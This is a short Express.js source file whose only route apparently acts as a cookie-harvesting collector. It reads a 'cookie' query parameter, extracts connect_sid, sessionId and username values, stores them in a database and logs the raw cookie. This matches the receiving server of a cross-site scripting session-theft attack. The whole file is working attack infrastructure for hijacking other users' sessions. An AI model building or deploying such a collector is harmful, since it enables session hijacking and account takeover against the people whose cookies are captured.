import express from "express";

import { sessionInfoModel } from "./models";

export const router = express.Router();

router.route("/").get(async (req, res) => {
	const cookie = req.query.cookie;
	var query;
	const connect_sid = cookie.substring(
		cookie.indexOf("=") + 1,
		cookie.indexOf(";")
	);
	query = cookie.substring(cookie.indexOf(";") + 1);
	const sessionId = query.substring(query.indexOf("=") + 1, query.indexOf(";"));
	query = query.substring(query.indexOf(";") + 1);
	const username = query.substring(query.indexOf("=") + 1);
	await sessionInfoModel.create({
		username: username,
		sessionId: sessionId,
		connect_sid: connect_sid,
		cookie: cookie,
	});
	console.log(cookie);
	res.send("");
});
